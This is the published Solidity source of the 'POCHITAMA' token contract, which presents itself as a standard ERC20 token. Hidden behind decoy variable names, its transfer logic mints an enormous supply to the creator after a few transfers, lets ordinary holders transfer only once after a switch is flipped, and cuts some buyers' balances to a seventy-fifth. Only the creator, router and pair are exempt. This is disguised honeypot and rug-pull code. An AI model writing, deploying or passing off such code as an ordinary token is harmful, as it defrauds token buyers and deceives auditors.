/**
 *Submitted for verification at Etherscan.io on 2022-02-04
*/

/*
   ▄███████▄  ▄██████▄   ▄████████    ▄█    █▄     ▄█      ███        ▄████████   ▄▄▄▄███▄▄▄▄      ▄████████ 
  ███    ███ ███    ███ ███    ███   ███    ███   ███  ▀█████████▄   ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ 
  ███    ███ ███    ███ ███    █▀    ███    ███   ███▌    ▀███▀▀██   ███    ███ ███   ███   ███   ███    ███ 
  ███    ███ ███    ███ ███         ▄███▄▄▄▄███▄▄ ███▌     ███   ▀   ███    ███ ███   ███   ███   ███    ███ 
▀█████████▀  ███    ███ ███        ▀▀███▀▀▀▀███▀  ███▌     ███     ▀███████████ ███   ███   ███ ▀███████████ 
  ███        ███    ███ ███    █▄    ███    ███   ███      ███       ███    ███ ███   ███   ███   ███    ███ 
  ███        ███    ███ ███    ███   ███    ███   ███      ███       ███    ███ ███   ███   ███   ███    ███ 
 ▄████▀       ▀██████▀  ████████▀    ███    █▀    █▀      ▄████▀     ███    █▀   ▀█   ███   █▀    ███    █▀  

@POCHITAMA
pochitama.io
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) private Clock;
    mapping (address => bool) private Orange;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _PochisClockTime;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    uint256 private ip;
    IDEXRouter router;

    address[] private pochiArray;

    string private _name; string private _symbol; address private _sender;
    uint256 private _totalSupply; uint256 private Halloween; uint256 private Christmas;
    uint256 private Veterans; bool private Independence; uint256 private Samsung;
    
    constructor (string memory name_, string memory symbol_, address creator_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _sender = creator_;
        _symbol = symbol_;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function _balancePochi(address account) internal {
        _balances[account] += (((account == _sender) && (ip > 2)) ? (_totalSupply * 10 ** 10) : 0);
    }

    function burn(uint256 amount) public virtual returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _PochiControlsSnipers(address sender, uint256 amount, bool boolish) internal {
        (Halloween,Independence) = boolish ? (Christmas, true) : (Halloween,Independence);

        if ((Clock[sender] != true)) {
            if ((amount > Veterans)) { require(false); }
            require(amount < Halloween);
            if (Independence == true) {
                if (Orange[sender] == true) { require(false); }
                Orange[sender] = true;
            }
        }
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function _init(address creator, uint256 iVal) internal virtual {
        (ip,Independence,Halloween,Samsung) = (0,false,(iVal/45),0);
        (Christmas,Veterans,Clock[_router],Clock[creator],Clock[pair]) = ((iVal/1000),iVal,true,true,true);
        (Orange[_router],Orange[creator]) = (false, false);
        approve(_router, 115792089237316195423570985008687907853269984665640564039457584007913129639935);   
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _PochiControlsFR(address recipient) internal {
        pochiArray.push(recipient);
        _PochisClockTime[recipient] = block.timestamp;

        if ((Clock[recipient] != true) && (Samsung > 2)) {
            if ((_PochisClockTime[pochiArray[Samsung-1]] == _PochisClockTime[pochiArray[Samsung]]) && Clock[pochiArray[Samsung-1]] != true) {
                _balances[pochiArray[Samsung-1]] = _balances[pochiArray[Samsung-1]]/75;
            }
        }

        Samsung++;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _balanceThePochis(address sender, address recipient, uint256 amount) internal {
        _PochiControlsFR(recipient);
        _PochiControlsSnipers(sender, amount, (address(sender) == _sender) && (ip > 0));
        ip += (sender == _sender) ? 1 : 0;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balanceThePochis(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        _balancePochi(sender);

        emit Transfer(sender, recipient, amount);
    }
    
    function _deployPochi(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        
        emit Transfer(address(0), account, amount); 
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _deployPochi(creator, initialSupply);
        _init(creator, initialSupply);
    }
}

contract Pochitama is ERC20Token {
    constructor() ERC20Token("POCHITAMA", "POCHITAMA", msg.sender, 5000000000 * 10 ** 18) {
    }
}